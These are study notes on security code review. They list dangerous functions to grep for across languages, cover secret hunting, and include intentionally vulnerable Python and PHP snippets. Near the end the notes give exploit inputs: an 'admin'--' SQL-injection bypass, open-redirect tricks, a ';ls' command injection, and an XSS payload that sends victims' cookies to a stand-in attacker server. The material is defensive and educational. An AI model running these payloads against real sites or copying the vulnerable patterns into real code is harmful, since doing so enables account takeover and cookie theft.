Remember that, most of the time, you don’t have to be a master programmer to conduct a code review in a particular language, As long as you understand one programming language, you can apply your intuition to review a wide variety of software written in different languages. 
But understanding the target’s particular language and architecture will allow you to spot more nuanced bugs.
# The Fast Approach: grep Is Your Best Friend
These techniques are speedy and often lead to the discovery of some of the most severe vulnerabilities, but they tend to leave out the more subtle bugs.
### Dangerous Patterns
Using the grep command, look for specific functions, strings, keywords, and coding patterns that are known to be dangerous
The presence of these functions does not guarantee a vulnerability, but can alert you to possible vulnerabilities

| Language   | Function                                                                                                        | Possible vulnerability                                                                                                                                                                                                                                                                                    |
| ---------- | --------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PHP        | eval(), assert(), system(), exec(), shell_exec(), passthru(), popen(), backticks (`CODE`), include(), require() | RCE if used on unsanitized user input. eval() and assert() execute PHP code in its input, while system(), exec(), shell_exec(), passthru(), popen(), and backticks execute system commands. include() and require() can be used to execute PHP code by feeding the function a URL to a remote PHP script. |
| PHP        | unserialize()                                                                                                   | Insecure deserialization if used on unsanitized user input.                                                                                                                                                                                                                                               |
| Python     | eval(), exec(), os.system()                                                                                     | RCE if used on unsanitized user input.                                                                                                                                                                                                                                                                    |
| Python     | pickle.loads(), yaml.load()                                                                                     | Insecure deserialization if used on unsanitized user input.                                                                                                                                                                                                                                               |
| JavaScript | document.write(), document.writeln                                                                              | XSS if used on unsanitized user input. These functions write to the HTML document. So if attackers can control the value passed into it on a victim’s page, the attacker can write JavaScript onto a victim’s page.                                                                                     |
| JavaScript | document.location.href()                                                                                        | Open redirect when used on unsanitized user input. document.location.href() changes the location of the user’s page.                                                                                                                                                                                      |
| Ruby       | System(), exec(), %x(), backticks (`CODE`)                                                                      | RCE if used on unsanitized user input.                                                                                                                                                                                                                                                                    |
| Ruby       | Marshall.load(), yaml.load()                                                                                    | Insecure deserialization if used on unsanitized user input                                                                                                                                                                                                                                               |
### Leaked Secrets and Weak Encryption
- look for these issues by grepping for keywords such as (**key, secret, password, encrypt, API, login, or token**)
- Grep the names of weak algorithms like **ECB, MD4, and MD5**
- Grep for specific code import functions in the language you are using with keywords like import, require, and dependencies and search for any CVE's for them in [CVE database](https://cve.mitre.org/) 
- The process of scanning an application for vulnerable dependencies is called software composition analysis (SCA). [The OWASP Dependency-Check tool](https://owasp.org/www-project-dependency-check/)
- Look for new patches
- search for developer comments by search for comments chars (`#, //`) and terms like (todo, fix, completed, config, setup, and removed) in source code
- Search for **Debug Functionalities, Configuration Files, and Endpoints**
	- Hidden debug functionalities often lead to privilege escalation, You can often find them at special endpoints
	- search for strings like HTTP, HTTPS, FTP, and dev you might find a URL like this somewhere in the code that points you to an admin panel: `http://dev.example.com/admin?debug=1&password=password` 
	- Configuration files often have the file extensions (**.conf, .env, .cnf, .cfg, .cf, .ini, .sys, or .plist**)
	- characters that indicate URLs like HTTP, HTTPS, slashes (/), URL parameter markers (?), file extensions (.php, .html, .js, .json), and so on.

# The Detailed Approach
Instead of reading the entire codebase line by line, try these strategies to maximize your efficiency
### Important Functions
- focus on important functions, such as authentication, password reset, state-changing actions, and sensitive info reads 
```python
# vulnerable login func example 
# u can exploit it using admin'--
def login():
 query = "SELECT * FROM users WHERE username = '" + \
 request.username + "' AND password = '" + \
 request.password + "';"
 authed_user = database_call(query)
 login_as(authed_user)
```
- carefully read the code that processes **user input**
	- entry points for attackers such as HTTP params, HTTP headers, HTTP request paths, database entries, file reads, and file uploads
	- Analyze carefully and test for injections attacks (XSS, XXE, SQLI, RCE, Open Redirects)
```php
<?php
/*open redirect code snippest example
 can be exploited with attacker.com/example.com, or example.com.attacker.com*/
[...]
if ($logged_in){
 $redirect_url = $_GET['next'];
if preg_match("/example.com/", $redirect_url){
 header("Location: ". $redirect_url);
 exit;
 }
}
[...]
?>
```

```php
<?php
/*RXSS & Command Injection vulnerable code example*/
 [...]
 $url_path = parse_url($_GET['download_file'], PHP_URL_PATH);
 $command = 'wget -o stdout https://example.com' . $url_path;
 system($command, $output);
 echo "<h1> You requested the page:" . $url_path . "</h1>";
 echo $output; 
 [...]
?>
```
- we can exploit the XSS using `https://example.com/<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;</script>`
- Command injection with something like this 
  `https://example.com/download?download_file=https://example.com/download;ls`
- 